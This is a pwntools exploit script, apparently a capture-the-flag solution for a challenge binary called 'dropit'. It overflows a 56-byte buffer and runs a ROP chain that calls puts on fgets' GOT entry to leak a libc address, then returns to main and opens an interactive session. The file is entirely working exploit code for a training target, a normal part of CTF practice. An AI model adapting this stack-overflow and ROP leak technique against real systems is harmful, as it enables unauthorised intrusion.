from pwn import *

p = remote('challenges.ctfd.io' , 30261)
#p = process('./dropit') 
binary = ELF('dropit' , checksec = False)
rop = ROP(binary)

OFFSET = cyclic(56) # found we overflow script

POP_RDI_ROP = rop.find_gadget(['pop rdi'])[0]
log.info("pop rdi gadget : " + hex(POP_RDI_ROP)) 

RET_ROP = rop.find_gadget(['ret'])[0]
log.info("ret rop gadget : " + hex(RET_ROP))

#globat offset table of the function we are gonna leak

FGETS_GOT = binary.got['fgets']
log.info("fgets got : " + str(FGETS_GOT))

#the procedure linkage table address of the function we are gonna leak

FGETS_PLT = binary.symbols['fgets']
log.info("fgets plt : " + str(FGETS_PLT))

#the procedure linkage table address of the function puts
PUTS_PLT = binary.symbols['puts']

#main plt
MAIN_PLT = binary.symbols['main']
log.info("main plt : " + str(MAIN_PLT))

#rop chain

#rop_chain1 = OFFSET + p64(RET_ROP) + p64(POP_RDI_ROP) + p64(FGETS_GOT) + p64(FGETS_PLT) + p64(MAIN_PLT) # doesnt work
#rop_chain1 = OFFSET + p64(RET_ROP) + p64(POP_RDI_ROP) + p64(FGETS_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT) # also works
rop_chain1 = OFFSET + p64(POP_RDI_ROP) + p64(FGETS_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
p.clean()
p.sendline(rop_chain1)

leak = int(hex(u64(p.recvuntil('\n').ljust(8, b'\x00')))[3:], 16)
log.info("leaked address : " + hex(leak))
p.clean()
p.interactive()
